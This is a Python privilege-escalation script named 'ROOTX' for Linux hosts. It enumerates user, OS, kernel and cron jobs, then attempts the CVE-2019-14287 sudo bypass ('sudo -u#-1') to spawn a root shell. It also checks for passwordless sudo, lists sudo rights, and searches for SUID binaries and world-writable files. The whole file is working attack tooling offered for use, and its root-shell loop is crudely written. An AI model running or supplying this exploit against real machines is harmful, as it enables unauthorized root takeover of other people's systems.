
import os
import subprocess
from colorama import Fore

print(Fore.MAGENTA + """
 ╦═╗╔═╗╔═╗╔╦╗═╗ ╦
 ╠╦╝║ ║║ ║ ║ ╔╩╦╝
 ╩╚═╚═╝╚═╝ ╩ ╩ ╚═ """   + Fore.RESET + Fore.GREEN + "V1.1\n" + Fore.RESET)
 
print('[' + Fore.CYAN + 'Username' + Fore.RESET + '] ' + Fore.WHITE + os.getlogin() + Fore.RESET)
OS = subprocess.getoutput("cat /etc/issue")
Kernal = subprocess.getoutput("uname -r")
cronjobs = subprocess.getoutput('crontab -l')
if 'no crontab for' in cronjobs:
    print('[' + Fore.CYAN + 'Checking Cronjobs' + Fore.RESET + '] ' + Fore.WHITE + 'No Crontabs found for User ' + os.getlogin() + Fore.RESET)
else:
    print(Fore.WHITE + cronjobs)
print("[" + Fore.CYAN + "OS" + Fore.RESET + "] " + Fore.WHITE + OS[:14] + Fore.RESET)
print("[" + Fore.CYAN + "Kernal" + Fore.RESET + "] " + Fore.WHITE + Kernal + Fore.RESET)
print('[' + Fore.CYAN + 'Exploiting CVE-2019-14287' + Fore.RESET + '] ' + Fore.WHITE + 'Gain R00T Shell if SUDO is ' + Fore.RED + 'Vulnerable' + Fore.RESET)
root = subprocess.getoutput('sudo -u#-1 whoami')
if 'root' in root:
    print('[' + Fore.RED + 'Vulnerable' + Fore.RESET + ']' + Fore.WHITE + 'To R00t ' + Fore.RED + 'Exploit!' + Fore.RESET)
    print('[' + Fore.CYAN + 'Executing' + Fore.RESET + ']' + Fore.RED + 'R00t ' + Fore.WHITE + 'Shell' + Fore.RESET)
    while True:
        root = subprocess.getoutput('sudo -u#-1 /bin/bash')
else:
    print('[' + Fore.CYAN + 'Not Vulnerable' + Fore.RESET + '] ' + Fore.WHITE + 'To ' + Fore.RED + 'CVE-2019-14287' + Fore.RESET)
        
nopasswd = subprocess.getoutput('sudo -u root -n true')
if 'a password is required' in nopasswd:
    print('[' + Fore.CYAN + 'Root Account' + Fore.RESET + ']' + Fore.RED + ' Not Vulnerable' + Fore.WHITE + ' to ' + Fore.RED + 'NO PASSWD ' + Fore.WHITE + 'escalation' + Fore.RESET)
    print('[' + Fore.CYAN + 'Checking Current' + Fore.RESET + '] ' + Fore.WHITE + 'User Permissions...' + Fore.RESET)
    perm = subprocess.getoutput('sudo -l')
    if '(ALL : ALL)' in perm:
        print('[' + Fore.RED + 'Access Granted' + Fore.RESET + '] ' + Fore.WHITE + 'You have ' + Fore.RED + 'ALL Permissions!' + Fore.RESET)
    else:
        print(perm)
else:
    print('[' + Fore.RED + 'Vulnerable' + Fore.RESET + ']' + Fore.WHITE + 'to sudo' + Fore.RED + 'No PASSWD' + Fore.WHITE + 'escalation' + Fore.RESET)

run_SUID = input('[' + Fore.CYAN + 'Question' + Fore.RESET + '] ' + Fore.WHITE + 'Did you want to check for ' + Fore.RED + 'SUID ' + Fore.WHITE + 'Binaries' + Fore.CYAN + ' Y/N ' + Fore.RESET)
if run_SUID.upper() == "Y":
    print('[' + Fore.CYAN + 'Checking' + Fore.RESET + '] ' + Fore.WHITE +  'for' + Fore.RED + ' SUID ' + Fore.WHITE + 'Binaries...' + Fore.RESET)
    SUID = subprocess.getoutput('find / -perm -u=s -type f 2>/dev/null')
    print(Fore.WHITE + SUID + Fore.RESET)
    
check_write = input('[' + Fore.CYAN + 'Question' + Fore.RESET + '] ' + Fore.WHITE + 'Did you want to check for ' + Fore.RED + 'Write Permissions' + Fore.CYAN + ' Y/N ' + Fore.RESET)
if check_write.upper() == "Y":
    CW = subprocess.getoutput('find / -not -type l -perm   -o+w')
    print(Fore.WHITE + CW + Fore.RESET)
